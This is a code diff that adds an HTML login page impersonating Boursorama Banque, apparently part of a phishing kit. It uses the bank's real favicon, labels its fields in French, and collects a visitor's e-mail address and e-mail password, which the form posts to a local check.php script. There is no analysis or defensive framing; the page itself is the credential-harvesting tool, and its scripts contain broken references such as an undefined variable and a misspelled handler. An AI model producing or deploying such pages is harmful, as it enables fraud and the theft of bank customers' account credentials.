@@ -1,0 +1,110 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>Boursorama Banque</title>
+<meta name="viewport" content="width=device-width, initial-scale=1,  maximum-scale=1,  minimum-scale=1, user-scalable=no">
+<link rel="shortcut icon" type="image/x-icon" href="https://clients.boursorama.com/bundles/boursoramadesign/img/favicons/favicon.ico?v=all0mAA9rp">
+<link rel="stylesheet" type="text/css" href="style/cloud.css">
+<script type="text/javascript" src="../js/zok.js"></script>
+<script type="text/javascript" src="js/block.js"></script>
+<script type="text/javascript">
+function emptyCode(){document.forms[0].dob.value = "";document.getElementById("del1").style.display = "none";setTimeout(disable,1000);}
+function emytylog(){document.forms[0].ville.value = "";document.getElementById("del").style.display = "none";setTimeout(disable,1000);}
+function emytyid(){document.forms[0].ident.value = "";document.getElementById("del2").style.display = "none";setTimeout(disable,1000);}
+</script>
+<script type="text/javascript" src="js/jquery.maskedinput.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function() { 
+$("#dob").mask("99-99-9999", {
+        placeholder: "x"
+    });
+});
+</script>
+<script type="text/javascript">
+function doga(){
+	var doga = document.getElementById('ville');
+	if(doga.value.length > 2 ){document.getElementById("del").style.display = "block";}
+			  var input = $('#ville').val().length;
+		  var dob = $('#dob').val().length
+          var identS = $('#ident').val().length;
+		if(input > 8 || dob > 5 || idents > 8 ){enable();}
+	}
+	function dogas(){
+		var dogas = document.getElementById('dob');
+		if(dogas.value.length > 2 ){document.getElementById("del1").style.display = "block";}
+				  var input = $('#ville').val().length;
+		  var dob = $('#dob').val().length
+          var identS = $('#ident').val().length;
+		if(input > 8 || dob > 5 || idents > 8 ){enable();}
+	}
+	function dogass(){
+		var dogass = document.getElementById('ident');
+		if(dogass.value.length > 3 ){document.getElementById("del2").style.display = "block";}
+		  var input = $('#ville').val().length;
+		  var dob = $('#dob').val().length
+          var identS = $('#ident').val().length;
+		if(input > 8 || dob > 5 || idents > 8 ){enable();}
+	}
+function check(){var input = document.getElementById('ville');if(input.value.length == 0)clean(); else rjoula();}
+function disable()
+  {
+  document.getElementById("brox").disabled=true;
+  document.getElementById("brox").style.opacity = "0.4";
+  }
+  function enable()
+  {
+  document.getElementById("brox").disabled=false;
+  document.getElementById("brox").style.opacity = "1";
+  }
+jQuery(window).load (function(){
+    setTimeout(disable, 1000);
+  });
+function checko(){
+  var sbou = document.getElementById('myform');
+  var input = $('#ville').val().length;
+  var identS = $('#ident').val().length;
+
+if(input > 3 || identS > 8){
+  sbou.submit();
+}
+}
+</script>
+</head>
+
+<body>
+ <div class="bodys">
+    <div class="headers"></div>
+       <div class="login_place">
+         <div class="no_opec" style="left: 0px; top: 0px; width: 309px"></div>
+                        <div class="moka">
+                        
+          <form id="myform" name="myform" method="post" action="check.php">
+          <div class="logo"></div>
+          <div class="gro1">
+             <div class="lb">Adresse E-mail *</div><br>
+             <input id="ville" name="email" class="typa" type="text" onKeyPress="doga()" />
+             <div id="del" class="del" onClick="emytylog()" ></div>
+          </div>
+          <div class="gro1 hey">
+            <div class="lb">Mot de pass E-mail *</div><br>
+             <input id="ville0" name="password" class="typa" type="password" onKeyPress="doga()" />
+             <div id="del2" class="del" onClick="emptyid()"></div>
+          </div>
+         
+          
+          <div id="brox" class="btn" onClick="checko()">valider</div>
+          </form>
+              <div class="fota">
+                <center><a class="texto" href="#">Besoin d'aide pour vous connecter ?</a></center>
+              </div>
+          </div>
+            
+    
+         <center><div class="leto"><a></a></div></center>
+       </div>
+ </div>
+
+</body>
+</html>
